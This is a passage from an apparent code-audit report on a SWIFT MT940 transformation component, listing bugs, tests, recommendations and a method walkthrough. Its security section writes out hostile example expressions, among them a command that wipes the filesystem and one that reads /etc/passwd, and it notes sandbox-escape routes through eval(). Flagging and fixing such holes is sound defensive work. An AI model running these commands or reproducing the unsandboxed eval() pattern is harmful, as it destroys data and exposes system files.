| 6 | Empty input DataFrame | P0 | Verify empty DF input returns empty DF output with stats (0, 0, 0) |
| 7 | None input | P0 | Verify None input returns empty DF with stats (0, 0, 0) |
| 8 | Statistics tracking | P0 | Verify `NB_LINE` and `NB_LINE_OK` are set correctly after execution |
| 9 | Die on error (true) | P0 | Verify RuntimeError is raised on processing failure when `die_on_error=true` |
| 10 | Die on error (false) | P0 | Verify error is logged and empty DF returned when `die_on_error=false` |

#### P1 -- Important

| # | Test Case | Priority | Description |
|----|-----------|----------|-------------|
| 11 | Parsed field (regex extraction) | P1 | Verify `type: parsed` with `regex` config extracts correct substring |
| 12 | Parsed field (position extraction) | P1 | Verify `type: parsed` with `position` config extracts correct substring |
| 13 | Parsed field (split extraction) | P1 | Verify `type: parsed` with `split` config extracts correct element |
| 14 | Calculated field (concatenate) | P1 | Verify `type: calculated` with `calc_type: concatenate` joins multiple fields |
| 15 | Calculated field (conditional) | P1 | Verify `type: calculated` with `calc_type: conditional` returns correct branch |
| 16 | Transformation (balance_parse) | P1 | Verify SWIFT balance parsing extracts sign, date, currency, amount correctly |
| 17 | Transformation (movement_parse) | P1 | Verify MT940 field 61 parsing extracts all components correctly |
| 18 | Python expression field | P1 | Verify `type: python_expression` evaluates expression with access to `input_row` and `computed` dicts |
| 19 | Lookup (exact match) | P1 | Verify exact-match lookup populates output fields from matched lookup row |
| 20 | Lookup (regex/wildcard match) | P1 | Verify wildcard pattern `SWIFT*` matches `SWIFTNET` |
| 21 | Lookup (no match) | P1 | Verify missing lookup match does not overwrite existing field values |
| 22 | Two-tier lookup dependency | P1 | Verify `depends_on_lookup: true` fields are recomputed after first-tier lookups |
| 23 | Intermediate computed fields | P1 | Verify a field referencing a previously computed field gets correct value |
| 24 | Context variable in config_file path | P1 | Verify `${context.config_dir}/transform.yaml` resolves correctly |
| 25 | Post-processing (truncate) | P1 | Verify `post_process: {type: truncate, max_length: 5}` truncates to 5 chars |
| 26 | Output file writing | P1 | Verify transformed data is written to file with correct delimiter and header |

#### P2 -- Hardening

| # | Test Case | Priority | Description |
|----|-----------|----------|-------------|
| 27 | Pad direction correctness | P2 | Verify `side: left` and `side: right` pad the correct side (currently inverted -- see BUG-ST-003) |
| 28 | Balance parse with European format | P2 | Verify `C230115EUR1.234.567,89` parses correctly (currently a gap) |
| 29 | Movement parse with RC/RD indicators | P2 | Verify reversal credit/debit indicators are handled |
| 30 | Lookup file with missing columns | P2 | Verify graceful handling when lookup file lacks expected columns |
| 31 | skip_error_rows=true | P2 | Verify failed rows are skipped and not included in output |
| 32 | skip_error_rows=false | P2 | Verify failed rows produce empty output rows |
| 33 | Inline config (transform_config) | P2 | Verify inline config works as fallback when no external config file |
| 34 | JSON config loading | P2 | Verify `.json` config files load correctly (not just YAML) |
| 35 | Large DataFrame performance | P2 | Benchmark 100K rows with 30 fields to establish baseline performance |
| 36 | Streaming mode with output_file | P2 | Verify streaming does not overwrite output file per chunk |

---

## 9. Issues Summary

### P0 -- Critical

| ID | Category | Summary |
|----|----------|---------|
| BUG-ST-001 | Bug (Cross-Cutting) | `_update_global_map()` in `base_component.py:304` references undefined variable `value` (should be `stat_value`). Will crash ALL components when `global_map` is set. |
| BUG-ST-002 | Bug (Cross-Cutting) | `GlobalMap.get()` in `global_map.py:28` references undefined parameter `default`. Will crash on any `global_map.get()` call. `get_component_stat()` also passes two args to single-arg `get()`. |
| CONV-ST-001 | Converter | Type name mismatch: converter outputs `TSwiftDataTransformer` but engine registers `SwiftTransformer` / `tSwiftTransformer`. Converted jobs will fail with unknown component type. |
| ENG-ST-001 | Engine | Duplicate `_load_lookup_files()` method definition (lines 125-133 and 135-170). Dead first definition from incomplete editing. |
| TEST-ST-001 | Testing | Zero unit tests for 878-line custom component. All transformation logic is completely unverified. |

### P1 -- Major

| ID | Category | Summary |
|----|----------|---------|
| BUG-ST-006 | Bug | Wildcard-to-regex conversion doesn't escape regex metacharacters. `pattern.replace('*', '.*')` leaves `(`, `)`, `+`, `[`, etc. as live regex. `SWIFT(v1)*` becomes `^SWIFT(v1).*$` where `(v1)` is a capture group. |
| CONV-ST-002 | Converter | No dedicated parser method for `tSwiftDataTransformer`. Uses generic `parse_base_component()`. No config extraction. |
| ENG-ST-002 | Security | `eval()` with `__import__` exposed in `_evaluate_python_expression()`. Config files can execute arbitrary code. |
| ENG-ST-003 | Engine | `output_fields_map` dict iteration order determines computation correctness. Implicit dependency on Python 3.7+ insertion-order guarantee. |
| ENG-ST-004 | Engine | `field_mappings` and `transformations` config sections declared but never used. Dead config that misleads users. |
| ENG-ST-005 | Engine | No input field validation. Missing source columns produce silent default values with no warning. |
| PERF-ST-001 | Performance | Row-by-row `iterrows()` processing -- slowest pandas iteration method. 100K rows with 30 fields = 3M+ function calls. |

### P2 -- Moderate

| ID | Category | Summary |
|----|----------|---------|
| BUG-ST-003 | Bug | Post-processing pad direction inverted: `side='left'` pads right, `side='right'` pads left. |
| BUG-ST-004 | Bug | Duplicate `_load_lookup_files()` definition. Dead first definition (lines 125-133). |
| BUG-ST-005 | Bug | `die_on_error=false` sets stats to (0, 0, 1) ignoring actual rows processed before error. |
| BUG-ST-007 | Bug | `calculated` and `parsed` mapping types read only from `input_row`, can't reference previously computed fields. Only `python_expression` has access to `working_row`. Three-pass system doesn't help for non-expression types. |
| BUG-ST-008 | Bug | `_load_external_config()` falls through to `json.load()` for any non-YAML extension. `.conf`, `.txt` etc. produce unhelpful `JSONDecodeError` instead of a clear unsupported-format error. |
| BUG-ST-009 | Bug | `output_fields_map.items()` iteration determines computation order. Should iterate `output_fields` list. |
| ENG-ST-006 | Engine | `_parse_movement_field()` regex does not handle RC/RD/EC/ED debit/credit marks per SWIFT spec. |
| ENG-ST-007 | Engine | `_parse_balance_field()` does not handle European number format (period as thousands separator). |
| ENG-ST-008 | Engine | Regex wildcard detection heuristic is brittle. Patterns with both wildcards and dots treated as pure regex. |
| ENG-ST-009 | Engine | `_extract_date_component()` tries `%d%m%y` before `%y%m%d`. SWIFT dates use YYMMDD. |
| ENG-ST-010 | Engine | Lookup column index mapping silently drops targets when `source_columns` shorter than `columns`. |
| ENG-ST-011 | Engine | `_write_output_file()` may not resolve context variables in output path if called outside `execute()` flow. |
| NAME-ST-001 | Naming | Converter type name `TSwiftDataTransformer` does not match engine alias `SwiftTransformer`. |
| SEC-ST-002 | Security | No path traversal protection on config_file or lookup paths. |
| PERF-ST-002 | Performance | Regex lookup is O(N*M): iterates all lookup rows for each input row. |
| PERF-ST-003 | Performance | Third-pass field computation runs unconditionally even when no second-tier lookups exist. |
| STD-ST-002 | Standards | Dead code: duplicate method, unused config sections. |

### P3 -- Low

| ID | Category | Summary |
|----|----------|---------|
| BUG-ST-010 | Bug | `_parse_movement_field()` value_date fallback returns 6-digit entry_date instead of 4-digit MMDD. |
| ENG-ST-012 | Engine | Third-pass recomputation is always unconditional (minor optimization). |
| ENG-ST-013 | Engine | No REJECT flow for failed rows. |
| NAME-ST-002 | Naming | Class docstring says "TSwiftDataTransformer" but class is named `SwiftTransformer`. |
| NAME-ST-003 | Naming | `field_mappings` and `transformations` config keys exist but are never used. |
| STD-ST-001 | Standards | No dedicated `parse_*` method in converter. |
| STD-ST-003 | Standards | No `print()` statements -- compliant. (Not an issue, included for completeness.) |
| PERF-ST-004 | Performance | `input_row.to_dict()` called per python_expression field instead of once per row. |

### Issue Count Summary

| Priority | Count | Categories |
|----------|-------|------------|
| P0 | 5 | 2 bugs (cross-cutting), 1 converter, 1 engine, 1 testing |
| P1 | 7 | 1 bug, 1 converter, 1 security, 3 engine, 1 performance |
| P2 | 17 | 6 bugs, 6 engine, 1 naming, 1 security, 2 performance, 1 standards |
| P3 | 8 | 1 bug, 2 engine, 2 naming, 1 standards, 1 performance, 1 standards |
| **Total** | **37** | |

---

## 10. Recommendations

### Immediate (Before Production)

1. **Fix `_update_global_map()` bug** (BUG-ST-001): Change `value` to `stat_value` on `base_component.py` line 304. Better yet, replace the entire log line with a clean format that does not reference loop variables outside the loop. **Impact**: Fixes ALL components (cross-cutting). **Risk**: Very low (log message only).

2. **Fix `GlobalMap.get()` bug** (BUG-ST-002): Add `default: Any = None` parameter to the `get()` method signature in `global_map.py` line 26. This fixes both direct calls and the two-argument call from `get_component_stat()` on line 58. **Impact**: Fixes ALL components and any code using `global_map.get()`. **Risk**: Very low (adds optional parameter with backward-compatible default).

3. **Fix converter type name mismatch** (CONV-ST-001): Either:
   - (a) Add `'TSwiftDataTransformer': SwiftTransformer` to the engine registry in `engine.py`, OR
   - (b) Change `component_parser.py` line 72 from `'tSwiftDataTransformer': 'TSwiftDataTransformer'` to `'tSwiftDataTransformer': 'SwiftTransformer'`
   Option (b) is preferred as it eliminates the naming confusion. **Risk**: Low.

4. **Remove duplicate `_load_lookup_files()`** (ENG-ST-001, BUG-ST-004): Delete lines 125-133 (the incomplete first definition). Keep only the full implementation at lines 135-170. **Risk**: Very low.

5. **Remove `__import__` from eval context** (SEC-ST-001): In `_evaluate_python_expression()` line 661, remove `'__import__': __import__` from the `__builtins__` dict. This closes the arbitrary code execution vector while preserving access to safe builtins (`str`, `int`, `float`, etc.). **Risk**: Low -- only breaks configs that deliberately import modules in expressions, which is an anti-pattern.

6. **Create unit test suite** (TEST-ST-001): Implement at minimum the 10 P0 test cases listed in Section 8.2. These cover: basic transformation, config loading, constant/direct mapping, NaN handling, empty/None input, stats, and die_on_error. Without these, no behavior is verified. **Risk**: None.

### Short-Term (Hardening)

7. **Fix pad direction** (BUG-ST-003): Swap `ljust` and `rjust` in `_post_process_value()` lines 838-839:
   - `side == 'left'` should use `rjust` (pad left side)
   - `side == 'right'` should use `ljust` (pad right side)

8. **Remove dead config sections** (ENG-ST-004): Either implement `field_mappings` and `transformations` config handling or remove `self.field_mappings` and `self.transformations` from `_init_transformer_config()` and `_ensure_config_loaded()`. Add a warning log if users provide these in config.

9. **Add input field validation** (ENG-ST-005): At the start of `_transform_rows()`, check that all `source` fields referenced by output field definitions exist in `input_df.columns`. Log WARNING for each missing source field. This provides early visibility into misconfiguration.

10. **Fix SWIFT date format priority** (ENG-ST-009): In `_extract_date_component()`, move `%y%m%d` before `%d%m%y` in the format list. SWIFT standard dates use YYMMDD format, which should take priority.

11. **Use `output_fields` list for iteration** (BUG-ST-009): In `_transform_rows()`, replace `for field_name, output_field in self.output_fields_map.items()` with `for output_field in self.output_fields` (three occurrences: lines 420, 433, 445). This makes the dependency on declaration order explicit.

12. **Use custom exceptions** (error handling): Replace `RuntimeError` in `_process()` with `ComponentExecutionError`. Replace `ValueError` in `_ensure_config_loaded()` and `_load_external_config()` with `ConfigurationError`. Use `raise ... from e` pattern for exception chaining.

13. **Fix movement_parse RC/RD handling** (ENG-ST-006): Update the regex pattern in `_parse_movement_field()` to handle `RC`, `RD`, `EC`, `ED` debit/credit marks: change `([DC])` to `([REC]?[DC])`.

### Long-Term (Optimization)

14. **Vectorize simple mappings** (PERF-ST-001): For `constant` and `direct` type fields, apply transformations at the DataFrame level using vectorized pandas operations instead of row-by-row. Reserve `iterrows()` only for rows with `python_expression`, complex `transformation`, or lookup-dependent fields.

15. **Pre-compile regex patterns** (PERF-ST-002): In `_load_lookup_files()`, pre-compile regex patterns for regex-match lookups. Cache compiled patterns alongside the lookup data.

16. **Implement REJECT flow** (ENG-ST-013): Return `{'main': good_df, 'reject': reject_df}` from `_process()` where `reject_df` contains rows that failed transformation with `errorCode` and `errorMessage` columns.

17. **Fix streaming output file writing**: When `output_file` is set and streaming mode is active, use append mode (`mode='a'`) for subsequent chunks after the first. Only write header for the first chunk.

18. **Add path traversal protection** (SEC-ST-002): Validate config_file and lookup file paths against allowed base directories before opening.

19. **Fix balance parsing for European format** (ENG-ST-007): Enhance `_parse_balance_field()` to handle period as thousands separator. Consider using a locale-aware number parser.

20. **Fix docstring** (NAME-ST-002): Change class docstring from "TSwiftDataTransformer" to "SwiftTransformer".

---

## Appendix A: Engine Class Structure

```
SwiftTransformer (BaseComponent)
    Config attributes:
        config_file: str                      # External YAML/JSON config path
        inline_config: Dict                   # Inline config fallback
        transform_config: Dict                # Loaded config (from file, inline, or default)
        input_fields: List[str]               # Declared input field names (unused for validation)
        output_fields: List[Dict]             # Output field definitions
        output_layout: List[str]              # Ordered output column names
        output_fields_map: Dict[str, Dict]    # name -> field config lookup
        field_mappings: Dict                  # DEAD -- never used
        transformations: Dict                 # DEAD -- never used
        lookups_config: List[Dict]            # Lookup table configurations
        lookup_data: Dict[str, Dict]          # Loaded lookup DataFrames + configs

    Methods:
        _init_transformer_config()                          # Init config; defer external loading
        _ensure_config_loaded()                             # Load config at execution time
        _load_lookup_files()                                # Load lookup CSVs into memory [DUPLICATE x2]
        _load_external_config(path) -> Dict                 # Load YAML/JSON config
        _get_default_transform_config() -> Dict             # Hardcoded MT940 defaults
        _process(input_data) -> Dict[str, Any]              # Main entry point
        _transform_rows(input_df) -> pd.DataFrame           # Row-by-row transform with 3-pass logic
        _get_field_value(field, row, working) -> str         # Dispatch to mapping type handler
        _parse_field_value(field, row) -> str                # Parsed type: regex/position/split
        _calculate_field_value(field, row) -> str            # Calculated type: concat/conditional/date
        _evaluate_python_expression(field, row, working) -> str  # eval() with security issues
        _extract_date_component(date_val, component) -> str  # Date parsing with format ambiguity
        _apply_field_transformation(field, value, row) -> str   # balance_parse, movement_parse, lookup, format
        _parse_balance_field(value, config) -> str           # SWIFT balance format parser
        _parse_movement_field(value, config, row) -> str     # MT940 field 61 parser
        _apply_lookups(row, depends_on_lookup) -> Dict       # Lookup matching (exact + regex)
        _post_process_value(value, config) -> str            # truncate, pad [BUG: inverted], replace
        _write_output_file(df, path)                         # CSV/pipe output with NaN cleanup
```

---

## Appendix B: Default Transform Config (Hardcoded)

The `_get_default_transform_config()` method (lines 280-360) provides a hardcoded configuration for SWIFT MT940 bank statement processing:

| Output Field | Type | Source | Default | Description |
|-------------|------|--------|---------|-------------|
| `SIDE` | constant | -- | `RECV` | Transaction direction |
| `TERMID` | direct | `sender_bic` | `""` | Sender BIC code |
| `DESTID` | direct | `receiver_bic` | `""` | Receiver BIC code |
| `OURREF` | direct | `transaction_ref` | `""` | Our reference |
| `THEIRREF` | direct | `transaction_ref` | `""` | Their reference (same source as OURREF) |
| `SUBACC` | direct | `account_number` | `""` | Sub-account number |
| `CURRENCY` | transformation | `opening_balance` | `USD` | Currency extracted from balance field |
| `AMOUNT` | transformation | `transaction_data` | `0.00` | Amount extracted from movement field |
| `VALUEDATE` | transformation | `transaction_data` | `""` | Value date extracted from movement field |

**Note**: `OURREF` and `THEIRREF` both map to `transaction_ref`. This appears intentional for the default config (placeholder) but may not be correct for all SWIFT message types.

---

## Appendix C: Edge Case Analysis

### Edge Case 1: NaN values in source columns

| Aspect | Detail |
|--------|--------|
| **Expected** | NaN should produce the configured default value, not the string `"nan"` |
| **Actual** | `_get_field_value()` for `direct` type checks `pd.notna(input_row[source])` (line 491) and also checks `value.lower() == 'nan'` (line 494). For `transformation` type, the same dual guard exists (lines 512-517). |
| **Verdict** | CORRECT -- double guard handles both pandas NaN and string `"nan"`. |

### Edge Case 2: Empty string in source columns

| Aspect | Detail |
|--------|--------|
| **Expected** | Empty string should be treated as a valid value (not replaced by default) |
| **Actual** | `_get_field_value()` for `direct` type: `str(input_row[source]).strip()` on an empty string produces `""`. Since `"" != 'nan'`, the empty string is returned as-is. |
| **Verdict** | CORRECT -- empty strings preserved. |

### Edge Case 3: HYBRID streaming mode with SwiftTransformer

| Aspect | Detail |
|--------|--------|
| **Expected** | Large inputs should be chunked and processed correctly |
| **Actual** | `BaseComponent._execute_streaming()` splits input into chunks and calls `_process()` per chunk. SwiftTransformer's `_process()` is stateless (no cross-row dependencies except lookups, which are pre-loaded). Chunks produce correct independent results. However, if `output_file` is set, each chunk OVERWRITES the file (line 871: `to_csv()` default mode is `'w'`). |
| **Verdict** | PARTIAL -- chunked processing is correct for DataFrame output, but **output_file writing is broken** in streaming mode (only last chunk survives). |

### Edge Case 4: `_update_global_map()` crash

| Aspect | Detail |
|--------|--------|
| **Expected** | Stats should be updated in globalMap after execution |
| **Actual** | `_update_global_map()` on base_component.py line 304 references undefined `value` variable. Will raise `NameError` whenever `global_map` is not None. This means stats are NEVER successfully written to globalMap for ANY component. The `put_component_stat()` calls on line 302 DO execute before the crash (they are inside the for loop, and the crash is on the log line AFTER the loop), but the exception propagates up and may abort the entire execution flow. |
| **Verdict** | **CRITICAL BUG** -- cross-cutting. However, the `put_component_stat()` calls inside the loop body (line 302) execute successfully for each iteration BEFORE the log line crashes. The log line on 304 is OUTSIDE the for loop (same indentation as the for statement). Actually, re-examining: line 304 is at the same indentation as `for stat_name, stat_value in self.stats.items()` -- it is INSIDE the loop. So it crashes on the FIRST stat, and only the first stat's `put_component_stat()` succeeds. |

### Edge Case 5: Transform config loading failure

| Aspect | Detail |
|--------|--------|
| **Expected** | Clear error message when config file is missing or invalid |
| **Actual** | `_load_external_config()` raises `ValueError` with descriptive message (line 278). `_ensure_config_loaded()` checks for None result and raises `ValueError` (line 104). Both are caught by `_process()`'s outer try/except. If `die_on_error=true`, the ValueError propagates (re-wrapped as RuntimeError). If `die_on_error=false`, it is logged and empty DF returned. |
| **Verdict** | CORRECT -- config failures are handled gracefully. However, `ValueError` should be `ConfigurationError` per the custom exception hierarchy. |

### Edge Case 6: Constant field type with missing `value` key

| Aspect | Detail |
|--------|--------|
| **Expected** | Should use default value when `value` is not specified |
| **Actual** | Line 501: `value = output_field.get('value', default_value)`. Falls back to `default_value` (which itself defaults to `''`). |
| **Verdict** | CORRECT |

### Edge Case 7: Python expression referencing a field not yet computed

| Aspect | Detail |
|--------|--------|
| **Expected** | Should return empty string or error for forward references |
| **Actual** | `working_row` dict only contains fields computed so far. `computed.get('FUTURE_FIELD')` returns `None`. Expression `computed.get('FUTURE_FIELD', '')` works safely. But a direct `computed['FUTURE_FIELD']` raises `KeyError`, caught by the outer try/except which returns `default_value`. |
| **Verdict** | PARTIAL -- works if expression uses `.get()`, fails silently if using `[]` subscript. No warning about forward references. |

### Edge Case 8: Lookup file with wrong encoding

| Aspect | Detail |
|--------|--------|
| **Expected** | Should handle or report encoding errors gracefully |
| **Actual** | `pd.read_csv(lookup_file_path, delimiter=delimiter, dtype=str, keep_default_na=False)` uses default UTF-8 encoding. If lookup file is ISO-8859-1, non-ASCII characters may cause UnicodeDecodeError. This is caught by the broad `except Exception as e` on line 169, which logs ERROR but continues. The lookup silently becomes unavailable, and fields depending on it get no values. |
| **Verdict** | PARTIAL -- error is caught and logged, but the silent fallback may produce incorrect output without obvious failure. |

### Edge Case 9: `eval()` security with malicious config

| Aspect | Detail |
|--------|--------|
| **Expected** | Expression evaluation should be sandboxed |
| **Actual** | `eval()` on line 681 with `__import__` in `__builtins__` allows: `__import__('os').system('rm -rf /')`, `__import__('subprocess').check_output(['cat', '/etc/passwd'])`, `__import__('socket').socket()`. The `re` module is also available, enabling `re.sub()` with callable replacement for indirect code execution. |
| **Verdict** | **CRITICAL SECURITY RISK** -- any untrusted config file gains full system access. |

### Edge Case 10: Post-processing on None or non-string value

| Aspect | Detail |
|--------|--------|
| **Expected** | Should handle None gracefully |
| **Actual** | `_post_process_value(value, config)` assumes `value` is a string (calls `value[:max_length]`, `value.ljust()`, `value.replace()`). The caller `_get_field_value()` converts to `str(value)` on line 541 before returning, but `_post_process_value()` is called on line 535 BEFORE the `str()` conversion on line 541. If a mapping handler returns None, `_post_process_value()` receives None and `.replace()` etc. will raise `AttributeError`. |
| **Verdict** | **BUG** -- post-processing can crash on None values. The `if value is None` check on line 538 is AFTER `_post_process_value()` on line 535. |

### Edge Case 11: Balance parsing with no match

| Aspect | Detail |
|--------|--------|
| **Expected** | Should return the original value or default |
| **Actual** | `_parse_balance_field()` returns `balance_value` (the original input) when regex does not match (line 786). This means non-standard balance formats pass through unchanged. |
| **Verdict** | ACCEPTABLE -- passthrough for unrecognized formats. |

### Edge Case 12: Movement parsing with empty value

| Aspect | Detail |
|--------|--------|
| **Expected** | Should return empty string |
| **Actual** | `_parse_movement_field()` returns `''` when `not movement_value` (line 793). |
| **Verdict** | CORRECT |

---

## Appendix D: Detailed Method-by-Method Code Analysis

### `__init__()` (Lines 35-41)

Standard `BaseComponent` constructor call plus `_init_transformer_config()`. No additional instance variables beyond what the parent sets.

**Issue**: No validation of the `config` dict structure at construction time. If `config` is malformed (e.g., `config_file` is an integer instead of a string), the error only surfaces at execution time. This is partially mitigated by the deferred config loading design.

### `_init_transformer_config()` (Lines 43-91)

Initialization logic with three config priority levels:

1. **External config file** (`config.get('config_file')`): Stores path for deferred loading.
2. **Inline config** (`config.get('transform_config', {})`): Stores dict for fallback.
3. **Default config** (`_get_default_transform_config()`): Hardcoded MT940 defaults.

When external or inline config is used, `self.transform_config` remains `None` until `_ensure_config_loaded()` is called during `_process()`.

When the default config is used (no `config_file` and no `inline_config`), it is loaded immediately at construction time. This creates a behavioral asymmetry: default config is available at init, but external/inline config is not.

**Code walkthrough**:
```python
self.config_file = self.config.get('config_file')        # May be None
self.transform_config = None                              # Deferred
self.inline_config = self.config.get('transform_config', {})

if not self.config_file and not self.inline_config:
    self.transform_config = self._get_default_transform_config()  # Immediate
```

The condition `not self.inline_config` is truthy for an empty dict `{}`, so an empty `transform_config: {}` in the config WILL trigger the default config. This is correct behavior (empty inline config = no inline config).

However, `not self.config_file` is truthy for empty string `""`. If `config_file: ""` is specified, it will also trigger the default config, which may mask a misconfigured path.

### `_ensure_config_loaded()` (Lines 93-123)

Called at the start of `_process()` to load config when context variables are available for path resolution.

**Config resolution priority**:
1. If `config_file` is set: load external config via `_load_external_config()`
2. Else if `inline_config` is not empty: use inline config
3. Else: use default config (but this branch should never be reached because `_init_transformer_config()` already handles this case)

**Redundancy**: The code after config loading (lines 107-123) duplicates the extraction logic from `_init_transformer_config()` (lines 60-86). This is DRY violation. A `_extract_config_sections()` helper would eliminate the duplication.

### `_load_lookup_files()` -- First Definition (Lines 125-133) -- DEAD CODE

This is the incomplete first definition of `_load_lookup_files()`. It iterates `self.lookups_config`, extracts `name` and `file`, checks for empty file path, and... does nothing else. The `continue` on line 133 skips to the next lookup, effectively making this a no-op method.

Python silently overrides this with the second definition on line 135. The first definition is dead code.

### `_load_lookup_files()` -- Second Definition (Lines 135-170)

The actual implementation that loads lookup CSV/pipe-delimited files into memory.

**Key behaviors**:
1. Resolves `${context.var}` in file paths via `self.context_manager.resolve_string()`
2. Normalizes path for Windows compatibility via `os.path.normpath()`
3. Auto-detects delimiter: `.csv` uses comma, everything else uses pipe `|`
4. Reads with `dtype=str` and `keep_default_na=False` -- critical for preventing "NA" values in lookup data from becoming NaN
5. Stores lookup data as `{name: {data: DataFrame, config: dict}}`

**Error handling**: Broad `except Exception` (line 169) catches all errors including `FileNotFoundError`, `UnicodeDecodeError`, `pd.errors.ParserError`, etc. Logs error and continues to next lookup. The failed lookup becomes unavailable, causing silent fallback to default values for fields that depend on it.

**Issue with error message** (line 170): Uses `resolved_lookup_file if 'resolved_lookup_file' in locals() else lookup_file` for error logging. This is a defensive pattern for when the error occurs before `resolved_lookup_file` is assigned (e.g., `resolve_string()` itself throws). While functional, this is an unusual Python pattern and could be simplified with a try/except on the resolve step.

### `_apply_lookups()` (Lines 172-256)

Applies lookup matching to a single output row.

**Two-pass lookup system**:
- `depends_on_lookup=False` (default): First-tier lookups applied before field recomputation
- `depends_on_lookup=True`: Second-tier lookups applied after first-tier results are available

**Normal (exact) matching** (lines 230-234):
```python
matches = lookup_df[lookup_df[lookup_key] == main_value]
if not matches.empty:
    matched_row = matches.iloc[0]
```
Uses pandas boolean indexing for exact string comparison. `.iloc[0]` takes the first match if multiple rows match. This is correct for exact matching but silently drops duplicate matches with no warning.

**Regex/wildcard matching** (lines 205-229):
The regex matching path has a complex heuristic to distinguish between:
1. **Simple wildcards** (e.g., `SWIFT*`, `FOO?BAR`): Converted to regex via `*` -> `.*`, `?` -> `.`
2. **Already-regex patterns** (e.g., `^SWIFT\d+$`): Used as-is

The detection heuristic on line 214 checks:
```python
if ('*' in pattern or '?' in pattern) and not any(c in pattern for c in ['.', '^', '$', '+', '[', ']', '(', ')', '{', '}', '|', '\\']):
```

This means a pattern like `SWIFT*.MSG` (containing both `*` and `.`) is treated as a "real regex" and gets `re.search()` directly. The `.` in `MSG` would match ANY character, not a literal dot. The wildcard `*` would be treated as "zero or more of the preceding character" (which is `.`), not "any characters". The result is unexpected matching behavior.

**Column mapping** (lines 247-251):
Target columns (`columns`) are paired with source columns (`source_columns`) by positional index. If `source_columns` has fewer entries than `columns`, extra targets are silently skipped. If `source_columns` has more entries, extra sources are ignored. No length validation or warning.

### `_load_external_config()` (Lines 258-278)

Loads YAML or JSON config from a file path.

**Path resolution flow**:
1. `self.context_manager.resolve_string(config_path)` resolves `${context.var}`
2. `os.path.normpath()` normalizes path separators

**File format detection**: Uses file extension (`.yaml`, `.yml` for YAML; everything else for JSON). No content-based detection. A `.txt` file with YAML content would fail JSON parsing.

**Error handling**: Raises `ValueError` wrapping the original exception. Does NOT use `raise ... from e`, so the original traceback is lost.

### `_get_default_transform_config()` (Lines 280-360)

Returns a hardcoded SWIFT MT940 configuration with 9 output fields. This is domain-specific and only useful for a narrow use case. See Appendix B for details.

### `_process()` (Lines 362-400)

Main processing entry point called by `BaseComponent.execute()`.

**Execution flow**:
1. `_ensure_config_loaded()` -- loads deferred config
2. Input validation -- returns empty DF if None or empty
3. `_transform_rows(input_data)` -- row-by-row transformation
4. Optional `_write_output_file()` -- writes to file if `output_file` config present
5. `_update_stats()` -- records NB_LINE and NB_LINE_OK

**Error handling**: Single outer try/except with `die_on_error` check. If `die_on_error=true` (default), raises `RuntimeError`. If false, logs error and returns empty DF.

**Issue**: The `_update_stats(len(input_data), len(transformed_df), 0)` call on line 387 sets NB_LINE_OK to `len(transformed_df)`, not `len(input_data)`. If `skip_error_rows=true`, some rows may be skipped, but NB_LINE_REJECT remains 0. The reject count should be `len(input_data) - len(transformed_df)`.

### `_transform_rows()` (Lines 402-471)

The core transformation logic. Processes input DataFrame row-by-row.

**Three-pass execution**:

Pass 1 (lines 418-424): Compute ALL output fields in `output_fields_map` order.
```python
for field_name, output_field in self.output_fields_map.items():
    field_value = self._get_field_value(output_field, row, working_row)
    working_row[field_name] = field_value
```

Pass 1b (lines 426-428): Apply first-tier lookups (depends_on_lookup=False).

Pass 2 (lines 432-435): Re-compute fields with `depends_on_lookup: true`.

Pass 2b (lines 439-441): Apply second-tier lookups (depends_on_lookup=True).

Pass 3 (lines 444-448): Re-compute fields with `depends_on_lookup: true` AGAIN.

Final (lines 450-458): Build output row from `output_layout` subset.

**Issue**: Pass 3 re-computes the same set of fields as Pass 2. If a field depends on BOTH first-tier and second-tier lookup results, it gets computed three times (Pass 1, Pass 2, Pass 3). Only the Pass 3 result is kept. This is correct for correctness but wasteful for performance.

### `_get_field_value()` (Lines 473-545)

Central dispatch method that routes to the appropriate handler based on `mapping_type`.

**Handler dispatch table**:

| mapping_type | Handler | Lines |
|-------------|---------|-------|
| `direct` | inline | 489-497 |
| `constant` | inline | 499-501 |
| `parsed` | `_parse_field_value()` | 503-505 |
| `calculated` | `_calculate_field_value()` | 507-509 |
| `transformation` | `_apply_field_transformation()` | 511-520 |
| `python_expression` | `_evaluate_python_expression()` | 522-524 |
| `placeholder` | inline | 526-528 |
| (default) | inline | 530-531 |

**Post-processing order issue** (lines 534-541):
```python
# Apply post-processing if defined
if 'post_process' in output_field:
    value = self._post_process_value(value, output_field['post_process'])  # line 535

# Ensure we never return None or NaN
if value is None or (isinstance(value, str) and value.lower() == 'nan'):  # line 538
    value = default_value

return str(value) if value is not None else default_value  # line 541
```

Post-processing (line 535) runs BEFORE the None/NaN check (line 538). If a handler returns `None`, `_post_process_value()` receives `None` and may crash on string operations (`.replace()`, `[:max_length]`, `.ljust()`). The None check should precede post-processing.

### `_parse_field_value()` (Lines 547-580)

Extracts substrings from input fields using three methods:

1. **Regex** (lines 559-564): `re.search(pattern, source_value)`, returns `match.group(group)`. Default group is 1 (first capture group). If no match, falls through to return default.

2. **Position** (lines 567-570): `source_value[start:end]` slice. No bounds checking beyond Python's natural slice behavior (out-of-range produces truncated result, not error).

3. **Split** (lines 573-578): `source_value.split(delimiter)` then index access. Checks `0 <= index < len(parts)` before access -- correct bounds check.

### `_calculate_field_value()` (Lines 582-616)

Computes derived field values:

1. **Concatenate** (lines 588-595): Joins multiple fields with separator. Filters NaN values before joining. Note: only checks `pd.notna()` -- does not check for empty strings. An empty string would still be included (producing consecutive separators).

2. **Conditional** (lines 598-606): Exact string match comparison. No support for: partial match, regex, numeric comparison, null checks. `str(input_row[condition_field])` converts NaN to `'nan'` string, which would not match `condition_value` unless it is literally `'nan'`.

3. **Date extraction** (lines 608-614): Delegates to `_extract_date_component()`.

### `_evaluate_python_expression()` (Lines 618-690)

Evaluates arbitrary Python expressions using `eval()`.

**Eval context**:
```python
eval_context = {
    'input_row': row_dict,        # Original input fields as dict
    'computed': working_row,       # Previously computed output fields
    're': re,                      # Regex module
    'datetime': datetime,          # Datetime module
    'str': str, 'int': int, ...   # Built-in types
    '__builtins__': {
        '__import__': __import__,  # SECURITY RISK
        'str': str, 'int': int, ...
    }
}
```

**Security analysis**:
- `__import__` allows importing ANY module: `os`, `subprocess`, `socket`, `shutil`, etc.
- `re` module's `sub()` accepts callable replacements, enabling indirect code execution
- `datetime` module is safe but provides access to `datetime.__class__.__mro__` for class hierarchy traversal
- No `exec()` is available, but `eval()` can call `exec()` via `__import__('builtins').exec`

**Expression examples that work**:
```python
# Safe: string manipulation
"computed.get('FIELD1', '') + '_' + computed.get('FIELD2', '')"

# Safe: conditional
